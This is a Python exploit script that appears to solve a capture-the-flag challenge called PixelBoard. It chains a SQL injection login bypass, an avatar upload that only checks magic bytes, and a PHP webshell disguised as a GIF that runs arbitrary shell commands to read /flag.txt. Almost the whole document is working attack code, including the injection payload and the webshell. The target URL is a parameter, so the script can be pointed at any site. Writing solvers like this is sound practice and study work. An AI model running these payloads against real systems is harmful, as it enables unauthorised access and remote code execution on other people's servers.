#!/usr/bin/env python3
"""
PixelBoard solver.

Chain:
1. login.php builds its SQL query by concatenating raw user input instead
   of using a prepared statement, so a classic auth-bypass payload logs us
   in as `admin` without knowing the password.
2. profile.php's avatar upload only checks the first few bytes of the file
   (the "magic bytes") against a list of known image signatures. It never
   checks the file extension, so a file that starts with a valid image
   header but ends in `.php` gets saved as-is and is happily executed by
   Apache/PHP.
3. Visit the uploaded "avatar" directly to run arbitrary shell commands and
   read /flag.txt.
"""
import argparse

import requests


def sqli_login(session: requests.Session, site: str) -> None:
    r = session.post(
        f"{site}/login.php",
        data={"username": "admin' -- ", "password": "anything"},
    )
    r.raise_for_status()
    if "login.php" in r.url or "Napačno" in r.text:
        raise SystemExit("[!] SQL injection login bypass failed.")
    print("[+] Logged in as admin via SQL injection auth bypass.")


def upload_shell(session: requests.Session, site: str) -> str:
    payload = b"GIF89a<?php system($_GET['cmd']); ?>"
    files = {"avatar": ("shell.php", payload, "image/gif")}
    r = session.post(f"{site}/profile.php", files=files)
    r.raise_for_status()
    shell_url = f"{site}/uploads/shell.php"
    print(f"[+] Uploaded PHP webshell disguised as a GIF: {shell_url}")
    return shell_url


def run_command(session: requests.Session, shell_url: str, cmd: str) -> str:
    r = session.get(shell_url, params={"cmd": cmd})
    r.raise_for_status()
    # The bytes before the "<?php" tag (our fake GIF magic bytes) are
    # literal output too, so strip that leading noise from the response.
    text = r.text
    if text.startswith("GIF89a"):
        text = text[len("GIF89a"):]
    return text


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--site", default="http://localhost:3000",
                     help="Base URL of the PixelBoard site")
    ap.add_argument("--cmd", default="cat /flag.txt",
                     help="Command to run on the uploaded webshell")
    args = ap.parse_args()
    site = args.site.rstrip("/")

    session = requests.Session()
    sqli_login(session, site)
    shell_url = upload_shell(session, site)

    output = run_command(session, shell_url, args.cmd).strip()
    print(f"[+] Output: {output}")


if __name__ == "__main__":
    main()
